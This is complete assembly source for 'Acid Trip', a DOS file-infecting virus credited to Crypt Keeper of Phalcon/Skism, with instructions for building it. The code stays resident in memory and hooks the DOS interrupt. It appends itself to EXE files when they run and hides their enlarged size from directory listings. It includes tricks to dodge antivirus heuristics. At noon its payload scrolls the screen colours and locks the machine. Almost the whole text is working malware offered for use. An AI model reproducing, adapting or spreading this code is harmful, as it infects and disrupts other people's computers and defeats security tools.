;
; Acid Trip   by Crypt Keeper [Phalcon/Skism]
;
; Acid Trip is an Enemy Within variant with a trigger routine and
; a few bug fixes.  It goes off at 12:00pm (any day) if the monitor
; is in 80x25x16color text mode, scrolling wildly through the color
; pallete and displaying "Your PC is on an [Acid Trip]...  Try again
; later..." near the center of the screen.
;

; To compile:

; TASM ACIDTRIP.ASM /M3
; TLINK ACIDTRIP.OBJ /t
; .COM file can be executed with no modifications

	.model tiny
	.code

	org 100h                       ;make this a com file

acidtrip:

;----------------------------------------------------------------------------

vlength	equ	vbot-offset(acidtrip)  ;Virus length in bytes
heapsiz	equ	hbot-htop              ;size of heap data in bytes
ressize	equ	1256/16                ;Virus size resident
virusid	equ	08AC5h                 ;Virus ID word in EXE header
chkfunc	equ	0FFFFh                 ;Check resident function for int 21h

;----------------------------------------------------------------------------

	push ds es                     ;save startup registers

	db	0BDh                   ;mov bp,
delta	dw	0                      ;delta offset

	xor ax,ax
	dec ax                         ;AX=FFFF (check resident function)
	int 21h                        ;check if virus is resident

	inc ax                         ;is virus resident (zero if yes)
	jz return                      ;if so, don't install

	;Microsoft Windows/Desqview compatable load resident routine
install:
	mov ah,48h                     ;allocate memory
	mov bx,ressize                 ;amount of memory to request
	int 21h

	jc not_enough_memory           ;carry set means allocation error

	mov es,ax                      ;ax=segment of allocated memory

	dec ax
	mov ds,ax                      ;segment of MCB for memory
	mov word ptr ds:[01h],08h      ;set memory block as independant
	jmp short memory_allocation_complete
not_enough_memory:
	pop ax
	push ax                        ;get PSP value off stack
	mov es,ax                      ;ES=PSP for set memory block size
	dec ax
	mov ds,ax                      ;get segment of this program's MCB

	mov bx,word ptr ds:[03h]       ;get size of current block
	dec bx                         ;decrease size of memory block

	mov ah,4Ah                     ;set memory block size
	int 21h
	
	jc return                      ;return if allocation error
	jmp short install              ;try to allocate again
memory_allocation_complete:
	push cs
	pop ds

	push es                        ;save found target segment

	mov ax,3521h                   ;get int 21h vector
	int 21h

	mov [bp+offset(i21vecs)],es
	mov [bp+offset(i21veco)],bx

	pop es

	mov cx,(vlength+heapsiz+1)/2   ;words to move
	mov di,100h                    ;destination in memory
	lea si,[bp+offset(acidtrip)]   ;source of viral code

	rep movsw                      ;copy ourselves up there

	push es
	pop ds                         ;segment to set int vector
	mov dx,offset(i21vec)          ;int 21h vector

	mov ax,2421h                   ;set int 21h vector
	inc ah                         ;without setting off mem resident
	int 21h                        ;code heuristic flags

return:	pop bx                         ;segment of PSP
	mov es,bx

	add bx,16                      ;compensate for PSP size
	add cs:[bp+offset(old_cs)],bx  ;add PSP to initial CS

	pop ds                         ;restore old DS register

	cli                            ;clear interrupt enable flag
	mov ax,cs:[bp+offset(old_ss)]  ;old SS register
	add ax,bx                      ;add PSP adress
	mov ss,ax
	db	0BCh                   ;mov sp,
old_sp	dw	0                      ;old stack pointer
	sti                            ;set interrupt enable flag

	jmp dword ptr cs:[bp+offset(old_ip)] ;jump to original EXE code

;----------------------------------------------------------------------------

vauthor	db	'Crypt Keeper P/S'

old_ip	dw	0
old_cs	dw	0FFF0h                 ;Old CS:IP

old_ss	dw	0FFF0h                 ;old stack segment

message	db	'Your PC is on an [Acid Trip]... Try again later...$'

;----------------------------------------------------------------------------

i21vec:	cmp ax,chkfunc                 ;check resident function?
	jne no_check_func

	iret                           ;return from interrupt

no_check_func:
	push ax bx cx dx               ;push all used registers

	mov ah,2Ch                     ;get time
	call function

	cmp cx,0C00h                   ;12:00pm?
	jne no_trippin                 ;if not, don't trigger

	mov ah,15                      ;return current video state
	int 10h                        ;BIOS video call

	cmp al,3                       ;text mode?
	jne no_trippin                 ;if not, don't trigger

	mov dx,0A0Fh                   ;row,column for cursor
	mov ah,2                       ;set cursor position
	int 10h

	push cs
	pop ds

	mov dx,offset(message)         ;message to display
	mov ah,9                       ;print string
	call function

	mov ax,1002h                   ;Set palette registers, from buffer
trippin:
	inc dx                         ;move to next group of numbers in mem
	int 10h
	jmp short trippin
		
no_trippin:
	pop dx cx bx ax                ;pop old registers

	push ax                        ;save old AX
	inc ah                         ;avoid execute intercept heuristic flags

	cmp ax,4C00h                   ;load and execute program?
	je _infect_on_exec

	cmp ax,4C01h                   ;load program?
	je _infect_on_exec

	pop ax                         ;restore old AX value

	cmp ah,11h                     ;find first file (FCB)?
	je FCB_dir_stealth

	cmp ah,12h                     ;find next file (FCB)?
	je FCB_dir_stealth

	cmp ah,4Eh                     ;find first file (DTA)?
	je DTA_dir_stealth

	cmp ah,4Fh                     ;find next file (DTA)?
	je DTA_dir_stealth

exit_interrupt_chained:
	jmp dword ptr cs:i21veco       ;execute rest of interrupt chain
_infect_on_exec:
	pop ax                         ;restore old AX
	jmp infect_file                ;and attempt to infect

FCB_dir_stealth:
	call function                  ;go ahead and execute

	pushf
	push dx cx bx es ax            ;push all used registers

	test al,al                     ;was find successful?
	jnz exit_interrupt_stealth

	mov ah,51h                     ;Get PSP address
	int 21h

	mov es,bx                      ;ES=PSP address

	sub bx,word ptr es:[16h]       ;parent PSP?
	jnz exit_interrupt_stealth

	mov bx,dx
	mov al,byte ptr [bx]           ;first byte of FCB

	push ax

	mov ah,2Fh                     ;get DTA adress
	int 21h

	pop ax

	inc al
	jnz checkFCBinfected           ;extended FCB?

	add bx,007h                    ;If so, make into normal

checkFCBinfected:
	mov ax,word ptr es:[bx+17h]
	mov cx,word ptr es:[bx+19h]    ;Get time and date

	and ax,1Fh
	and cx,1Fh
	dec cx                         ;unmask seconds and date

	xor ax,cx                      ;file infected?
	jnz exit_interrupt_stealth     ;exit stealth interrupt

	sub word ptr es:[bx+01Dh],vlength
	sbb word ptr es:[bx+01Fh],ax   ;subtract virus size

exit_interrupt_stealth:
	pop ax es bx cx dx
	popf                           ;pop all used registers
exit_interrupt_stealthvec:
	retf 02h                       ;return with given flags

DTA_dir_stealth:                       ;DTA directory size subtract
	call function                  ;go ahead and execute

	jc exit_interrupt_stealthvec   ;exit if function unsuccessful

	pushf
	push dx cx bx es ax            ;push all used registers

	mov ah,2Fh                     ;get DTA adress
	int 21h

	mov ax,word ptr es:[bx+16h]
	mov cx,word ptr es:[bx+18h]    ;get time and date stamps

	and ax,1Fh
	and cx,1Fh
	dec cx                         ;unmask seconds and date

	xor cx,ax                      ;is file infected?
	jnz exit_interrupt_stealth     ;if not, don't subtract size

	sub word ptr es:[bx+1Ah],vlength
	sbb word ptr es:[bx+1Ch],cx    ;subtract virus size in bytes

	jmp short exit_interrupt_stealth

move_pointer_end:
	cwd                            ;zero cx and dx
	mov cx,dx
	mov ax,4202h                   ;move pointer from EOF
function:
	pushf
	call dword ptr cs:i21veco      ;simulate call to original int 21h
	ret
open_readwrite:                        ;opens file at DS:DX for read/write
	mov ax,3D00h                   ;open for read only access
	int 21h

	jc bad_open                    ;carry set means open error

	push cs
	pop ds

	push ax                        ;file handle
	mov bx,ax

	mov ax,1220h                   ;get JFT entry
	int 2Fh

	mov ax,1216h                   ;get SFT location
	mov bl,byte ptr es:[di]        ;handle number
	int 2Fh

	pop bx

	mov word ptr es:[di+02h],2     ;set file for read/write
	ret
bad_open:
	pop ax
	jmp short exit_infect          ;exit if bad open
infect_file:
	push ax si es di bx cx ds dx   ;push all used registers

	call open_readwrite            ;open file for read/write access

	mov cx,24                      ;24 bytes of header to read
	mov dx,offset(exeheader)       ;EXE header information

	mov ah,3Fh                     ;read file or device
	int 21h

	cmp cx,ax                      ;enough bytes read?
	jne bad_file                   ;if not, file too small

	mov cx,exeid
	cmp cx,'MZ'
	je disease_exe
	xor cx,'ZM'
	jz disease_exe                 ;exe file?
		
bad_file:
	mov ah,3Eh                     ;close file with handle
	int 21h
	
exit_infect:
	pop dx ds cx bx di es si ax    ;pop all used registers
	jmp exit_interrupt_chained     ;execute rest of interrupt chain

disease_exe:
	cmp chksum,virusid             ;file already infected?
	je bad_file                    ;if so, bad file

	lds si,dword ptr es:[di+0Dh]   ;get old file date and time
	push si ds                     ;and save
	
	push cs
	pop ds

	add minallc,ressize            ;add virus size in paragraphs

	push es                        ;save SFT segment

	les si,dword ptr ds:initss     ;get initial SS:SP (reversed)
	mov old_ss,si
	mov old_sp,es

	les si,dword ptr ds:initip     ;get initial CS:IP
	mov old_cs,es
	mov old_ip,si

	pop es

	call move_pointer_end          ;move file pointer to end of file

	mov cx,16
	div cx                         ;convert file size to seg:offset

	sub ax,headers                 ;subtract header size from segment

	mov initcs,ax
	mov initip,dx                  ;set initial cs:ip
	
	sub dx,100h
	mov delta,dx                   ;set delta offset in virus code

	add dx,offset(sspace)+64+100h
	mov initsp,dx
	mov initss,ax                  ;set initial SS:SP in exe header

	mov chksum,virusid             ;set file as already infected

	mov dx,100h                    ;offset of virus code in memory
	mov cx,vlength                 ;length of virus code

	mov ah,40h                     ;write file or device
	push ax
	int 21h
	
	call move_pointer_end          ;get file size

	mov cx,512
	div cx                         ;convert to pages

	test dx,dx                     ;no remainder?
	jz no_remainder

	inc ax                         ;if remainder add another page
no_remainder:
	mov expages,ax
	mov exbytes,dx                 ;set new exe size

	cwd
	mov word ptr es:[di+15h],dx
	mov word ptr es:[di+17h],dx    ;zero file pointer in SFT

	mov dx,offset(exeheader)       ;exe header information
	mov cx,24                      ;24 bytes to change

	pop ax                         ;write file or device
	int 21h

	pop dx cx                      ;old file date/time

	push dx                        ;save original file date
	and cx,-20h                    ;reset seconds
	and dx,1Fh
	dec dx                         ;unmask date field

	or cx,dx                       ;seconds=date
	pop dx                         ;restore old date

	mov ax,5701h                   ;set file date and time
	int 21h

	jmp bad_file                   ;close and exit
	
;----------------------------------------------------------------------------

vbot	equ	$                      ;bottom of virus code
htop	equ	$                      ;top of heap

i21veco	dw	0
i21vecs	dw	0                      ;old int 21h vector

exeheader:
exeid	dw	0      ;Unchanged      ;EXE signature
exbytes	dw	0                      ;number of bytes in last page
expages	dw	0                      ;number of pages in file
reloci	dw	0      ;Unchanged      ;number of items in relocation table
headers	dw	0      ;Unchanged      ;size of header in paragraphs
minallc	dw	0                      ;minimum memory to be allocated
maxallc	dw	0      ;Unchanged      ;maximum memory to be allocated
initss	dw	0                      ;initial SS value
initsp	dw	0                      ;initial SP value (used as ID word)
chksum	dw	0                      ;complimented checksum
initip	dw	0                      ;initial IP value
initcs	dw	0                      ;initial CS value
reltabl	dw	0      ;Unchanged      ;byte offset to relocation table
ovnum	dw	0      ;Unchanged      ;overlay number

hbot	equ	$                      ;bottom of heap data

sspace	db	70 dup (0)             ;virus stack

end	acidtrip                       ;end of virus code
